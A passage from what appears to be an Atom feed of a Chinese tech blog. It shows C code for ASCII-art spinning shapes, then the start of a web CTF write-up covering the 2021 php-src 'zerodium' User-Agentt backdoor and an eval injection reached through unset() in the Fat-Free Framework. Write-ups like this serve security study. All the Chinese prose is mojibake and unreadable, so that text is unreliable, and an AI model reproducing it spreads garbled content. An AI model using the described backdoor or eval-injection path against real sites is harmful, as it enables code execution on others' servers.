·æ‰èƒ½ç¨³å®šä½å›¾åƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dev C++ä¸‹åˆ™è°ƒç”¨Windows.hæ¥è§£å†³å›¾åƒåˆ·æ–°çš„é—®é¢˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_O</span><span class="params">()</span><span class="comment">//CSDNä¸ŠæŠ„çš„å‡½æ•°ï¼Œåˆ·æ–°ä¸€å¿«å…‰æ ‡å°±é£˜æ¥é£˜å»ï¼Œçœ‹èµ·æ¥åƒå™ªç‚¹ä¸€æ ·</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld.gif"></p><p>æœ€å¼€å§‹å…ˆå†™äº†ä¸ªå…‰æºç§»åŠ¨çƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_xy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   HANDLE hOut;</span><br><span class="line">hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">   COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">   SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line"><span class="keyword">int</span> size=<span class="number">45</span>;</span><br><span class="line"><span class="keyword">double</span> g=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">double</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> r=(<span class="keyword">double</span>(size)<span class="number">-4</span>)/<span class="number">2.0</span>;</span><br><span class="line"><span class="keyword">double</span> light[<span class="number">3</span>]=&#123;<span class="number">-1.3</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> length=<span class="built_in">sqrt</span>(light[<span class="number">0</span>]*light[<span class="number">0</span>]+light[<span class="number">1</span>]*light[<span class="number">1</span>]+light[<span class="number">2</span>]*light[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">light[i]=light[i]/length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.;!o*m0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> out_i[size][size]=&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> ro[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="built_in">cos</span>(rotate),-<span class="built_in">sin</span>(rotate)&#125;,&#123;<span class="number">0</span>,<span class="built_in">sin</span>(rotate),<span class="built_in">cos</span>(rotate)&#125;&#125;;</span><br><span class="line"><span class="keyword">double</span> light_r[<span class="number">3</span>]=&#123;light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">0</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">0</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">1</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">1</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">1</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">2</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">2</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">2</span>]&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> a=<span class="number">0.0</span>;a&lt;<span class="number">3.15</span>;a+=g)&#123;<span class="comment">//alpha </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> b=<span class="number">0.0</span>;b&lt;<span class="number">3.15</span>;b+=g)&#123;<span class="comment">//beta </span></span><br><span class="line"><span class="keyword">double</span> x=r*<span class="built_in">sin</span>(b)*<span class="built_in">cos</span>(a);</span><br><span class="line"><span class="keyword">double</span> y=r*<span class="built_in">sin</span>(b)*<span class="built_in">sin</span>(a);</span><br><span class="line"><span class="keyword">double</span> z=r*<span class="built_in">cos</span>(b);</span><br><span class="line"><span class="keyword">double</span> result=(x/r*light_r[<span class="number">0</span>]+y/r*light_r[<span class="number">1</span>]+z/r*light_r[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">final</span>=<span class="keyword">int</span>(result*<span class="number">10.0</span><span class="number">-1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(final&gt;10||final&lt;0)&#123;</span></span><br><span class="line"><span class="comment">if(final&gt;10)final=10;</span></span><br><span class="line"><span class="comment">else if(final&lt;0)final=0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> cx=<span class="keyword">int</span>(x+move);</span><br><span class="line"><span class="keyword">int</span> cy=<span class="keyword">int</span>(z+move);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">final</span>&gt;out_i[cx][cy])<span class="comment">//è¿™ç§å–æœ€å¤§äº®åº¦çš„å†™æ³•æ˜æ˜¾æ˜¯ä¸å¥½çš„ï¼Œä½†è¿™ä¸ªä¾‹å­ç‰¹æ®Šï¼Œç”¨èµ·æ¥æ²¡é—®é¢˜</span></span><br><span class="line">out_i[cx][cy]=<span class="keyword">final</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(out_i[i][j]!=<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">goto_xy(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™„ä¸Šç”œç”œåœˆçš„ä»£ç ï¼Œå†™æ–¹å—ä¹‹å‰æ²¡ä»”ç»†çœ‹è¿‡ï¼Œæ‰€ä»¥æˆ‘å†™çš„æ–¹å—éå¸¸å†—ä½™ï¼ˆä¸»è¦æ˜¯æƒ³å…ˆç‹¬ç«‹å°è¯•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> A = <span class="number">0</span>, B = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">float</span> z[<span class="number">1760</span>];</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">1760</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">32</span>,<span class="number">1760</span>);</span><br><span class="line">        <span class="built_in">memset</span>(z,<span class="number">0</span>,<span class="number">7040</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; <span class="number">6.28</span>; j += <span class="number">0.07</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">6.28</span>; i += <span class="number">0.02</span>) &#123;</span><br><span class="line">                <span class="keyword">float</span> c = <span class="built_in">sin</span>(i);</span><br><span class="line">                <span class="keyword">float</span> d = <span class="built_in">cos</span>(j);</span><br><span class="line">                <span class="keyword">float</span> e = <span class="built_in">sin</span>(A);</span><br><span class="line">                <span class="keyword">float</span> f = <span class="built_in">sin</span>(j);</span><br><span class="line">                <span class="keyword">float</span> g = <span class="built_in">cos</span>(A);</span><br><span class="line">                <span class="keyword">float</span> h = d + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">float</span> D = <span class="number">1</span> / (c * h * e + f * g + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">float</span> l = <span class="built_in">cos</span>(i);</span><br><span class="line">                <span class="keyword">float</span> m = <span class="built_in">cos</span>(B);</span><br><span class="line">                <span class="keyword">float</span> n = <span class="built_in">sin</span>(B);</span><br><span class="line">                <span class="keyword">float</span> t = c * h * g - f * e;</span><br><span class="line">                <span class="keyword">int</span> x = <span class="number">40</span> + <span class="number">30</span> * D * (l * h * m - t * n);</span><br><span class="line">                <span class="keyword">int</span> y= <span class="number">12</span> + <span class="number">15</span> * D * (l * h * n + t * m);</span><br><span class="line">                <span class="keyword">int</span> o = x + <span class="number">80</span> * y;</span><br><span class="line">                <span class="keyword">int</span> N = <span class="number">8</span> * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">22</span> &gt; y &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; x &gt; <span class="number">0</span> &amp;&amp; <span class="number">80</span> &gt; x &amp;&amp; D &gt; z[o]) &#123;</span><br><span class="line">                    z[o] = D;</span><br><span class="line">                    b[o] = <span class="string">&quot;.,-~:;=!*#$@&quot;</span>[N &gt; <span class="number">0</span> ? N : <span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">1761</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(k % <span class="number">80</span> ? b[k] : <span class="number">10</span>);</span><br><span class="line">            A += <span class="number">0.00004</span>;</span><br><span class="line">            B += <span class="number">0.00002</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;é€›bç«™çœ‹åˆ°ä¼šè½¬çš„ç”œç”œåœˆï¼Œå¯¹å›¾å½¢å­¦æœ‰ç‚¹ä¸Šå¤´ï¼Œè‡ªå·±æ‹¿èœ¥è¯­è¨€åšä¸ªç«‹æ–¹ä½“ç©ç©&lt;/p&gt;
&lt;img src=&quot;/images/å›¾å½¢å­¦HelloWorld.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="æ‘¸é±¼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
  </entry>
  
  <entry>
    <title>iæ˜¥ç§‹è™ç¬¦2021 web</title>
    <link href="https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/"/>
    <id>https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/</id>
    <published>2021-04-09T16:35:02.000Z</published>
    <updated>2022-08-02T06:50:24.774Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•é¢˜ç›®æ‰«ç›²ï¼Œåªæœ‰å‰ä¸‰é¢˜ï¼ŒåŒ…å«ä»¥ä¸‹pointsï¼š</p><p>â€‹    â‘ 3.28 php.netåé—¨</p><p>â€‹    â‘¡3F(FatFreeFramework)æ¡†æ¶</p><p>â€‹    â‘¢SQLä¸­md5()äº§ç”Ÿhexçš„â€™orâ€™è¿›è¡Œçš„æ³¨å…¥</p><p>â€‹    â‘£SSRFä¸gopheråè®®</p><span id="more"></span><h1 id="iæ˜¥ç§‹è™ç¬¦2021-web"><a href="#iæ˜¥ç§‹è™ç¬¦2021-web" class="headerlink" title="iæ˜¥ç§‹è™ç¬¦2021_web"></a>iæ˜¥ç§‹è™ç¬¦2021_web</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>2021.3.28å‡ºäº†phpå®˜æ–¹gitä»“åº“git.php.netè¢«æ’å…¥æ¶æ„ä»£ç çš„äº‹ï¼Œè‹¥ä½¿ç”¨æ­¤æºç è¿›è¡Œå¼€å‘ï¼Œç½‘ç«™å°±ä¼šæ‰§è¡Œuser_agenttå¤´ä¸­ä»¥zerodiumå¼€å§‹çš„ä»»æ„ä»£ç ï¼Œæ³¨æ„double tï¼Œæ²¡æœ‰æ‰“é”™</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0github.png"></p><center><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">view on github</a></center><p>é¢˜ç›®ç¯å¢ƒæ˜¯ä¸€ä¸ªblogï¼Œæœ€åä¸€ç¯‡æ–‡ç« æè¿°äº†åšå®¢æ­å»ºè¿‡ç¨‹ï¼Œåœ¨æ²¡æœ‰hintçš„æƒ…å†µä¸‹è¿™æ˜¯å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0blog.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span> = <span class="keyword">require</span>(<span class="string">&#x27;1ib/base.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;set( <span class="string">&#x27;DEBUG&#x27;</span> ,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCREVERSION &lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCREversion is out date&#x27;</span>);</span><br><span class="line"><span class="comment">//Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span> [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p align='right'><small>å…³é”®å­—ï¼šframeworkï¼Œf3</small></p><p>æ­¤ä¸ºåŸºäºf3æ¡†æ¶ç¼–å†™çš„ä»£ç ï¼Œæ‹¿åˆ°æ‰‹æ—¶åº”å…ˆæœ¬åœ°æ­å»ºæ­¤æ¡†æ¶ï¼Œå¯¹äºæœ¬é¢˜ï¼Œè¿™æ ·ä½ æ‰æœ‰äº†base.phpï¼Œæ‰å¯ä»¥è§£é¢˜ï¼Œå„ç§ä¸ç†Ÿæ‚‰å¯¼è‡´æ‰¾ä¸åˆ°æœ¬é¢˜å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3Framework.png"></p><p>æŠŠé¢˜ç›®ä»£ç copyè¿‡æ¥ï¼ŒåŠ ä¸ŠrouteæŒ‡å®šè·¯å¾„åæœ¬åœ°è¿è¡Œï¼ˆä¹Ÿå°±æ˜¯è¯´è¦å…ˆè®¾ç½®<code>route</code>å†<code>run</code>ï¼Œä¸ç„¶æ¡†æ¶è·‘éƒ½è·‘ä¸èµ·æ¥ï¼Œæ€ä¹ˆè®¾ç½®æŸ¥ä¸€ä¸‹æ–‡æ¡£å°±çŸ¥é“äº†Â¯\_(ãƒ„)_/Â¯ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /test.php&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;route set successfully&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3run.png"></p><p>ç›´æ¥æŠ¥é”™äº†ï¼Œçœ‹çœ‹530è¡Œevalçš„æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$val</span>=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,</span><br><span class="line">                          <span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.<span class="variable">$key</span>, <span class="literal">FALSE</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;);&#x27;</span>);    <span class="comment">#ç¬¬530è¡Œ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parts</span>[<span class="number">0</span>]==<span class="string">&#x27;SESSION&#x27;</span>) &#123;</span><br><span class="line">            session_commit();</span><br><span class="line">            session_start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿½ä¸€ä¸‹ä»£ç éªŒè¯ä¸€ä¸‹æ˜¯ä¸æ˜¯<code>unset</code>è§¦å‘çš„<code>clear()</code>ï¼Œå‘ç°è°ƒç”¨é“¾æ¡æ˜¯<code>__unset($key)</code>â†’<code>offsetunset($key)</code>â†’<code>clear($key)</code>å®é”¤</p><p>è§é‡Œé¢æœ‰ä¸€ä¸ª<code>compile()</code>ï¼Œåº·åº·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$evaluate</span>=<span class="literal">TRUE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!<span class="variable">$evaluate</span>)</span><br><span class="line">        ? preg_replace_callback(</span><br><span class="line">            <span class="string">&#x27;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#x27;</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expr</span>[<span class="number">2</span>]))</span><br><span class="line">                    <span class="variable">$str</span>.=preg_replace_callback(</span><br><span class="line">                        <span class="string">&#x27;/\.([^.\[\]]+)|\[((?:[^\[\]\&#x27;&quot;]*|(?R))*)\]/&#x27;</span>,</span><br><span class="line">                        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$sub</span></span>) </span>&#123;</span><br><span class="line">                            <span class="variable">$val</span>=<span class="keyword">isset</span>(<span class="variable">$sub</span>[<span class="number">2</span>]) ? <span class="variable">$sub</span>[<span class="number">2</span>] : <span class="variable">$sub</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (ctype_digit(<span class="variable">$val</span>))</span><br><span class="line">                                <span class="variable">$val</span>=(<span class="keyword">int</span>)<span class="variable">$val</span>;</span><br><span class="line">                            <span class="variable">$out</span>=<span class="string">&#x27;[&#x27;</span>.<span class="keyword">$this</span>-&gt;export(<span class="variable">$val</span>).<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="variable">$expr</span>[<span class="number">2</span>]</span><br><span class="line">                    );</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$str</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment">#------------------ä¸‹é¢è¿™æ®µéƒ½æ— å…³ï¼Œæ¯•ç«Ÿclear()é‡Œä¼ äº†FALSE------------------</span></span><br><span class="line">        : preg_replace_callback(</span><br><span class="line">        <span class="string">&#x27;/(?&lt;!\w)@(\w+(?:(?:\-&gt;|::)\w+)?)&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27;((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\-&gt;|::)\w+|\()*)/&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#...</span></span><br></pre></td></tr></table></figure><p>çœ‹æ ·å­å¯¹è¾“å…¥åšäº†æ”¹åŠ¨ï¼Œä½†å…¶å®ä¸æƒ³åˆ†æ<code>complie()</code>çš„è¯ï¼Œç›´æ¥<code>echo</code>å³å¯çŸ¥é“åˆ°åº•evaläº†ä»€ä¹ˆä»£ç </p><blockquote>å½“a=hello<br>[Out] unset('$this->hive['hello']');</blockquote><p>ä½†ç°åœ¨æ—¢ç„¶æ¯”èµ›å·²ç»ç»“æŸé‚£è¿˜æ˜¯ç¨å¾®æ·±å…¥çœ‹ä¸€ä¸‹<code>complie()</code>ï¼Œé‡åˆ°äº†æˆ‘æ²¡è§è¿‡çš„phpï¼šå›è°ƒï¼ŒåŒ¿åå‡½æ•°</p><ul><li><p>å›è°ƒï¼šåœ¨å‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸€èˆ¬æ˜¯ä¸èƒ½å»å¹²é¢„ä»–çš„è¡Œä¸ºçš„ï¼Œå½“å‡½æ•°è¢«è®¾è®¡æˆå¸¦æœ‰å›è°ƒåŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å°±æœ‰å¯èƒ½åœ¨å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å›è°ƒå‡½æ•°å»å¹²é¢„ä»–</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$n</span>, <span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$n</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span> ? <span class="variable">$f</span>(<span class="variable">$i</span>) : <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ— å›è°ƒæ—¶</span></span><br><span class="line">foo(<span 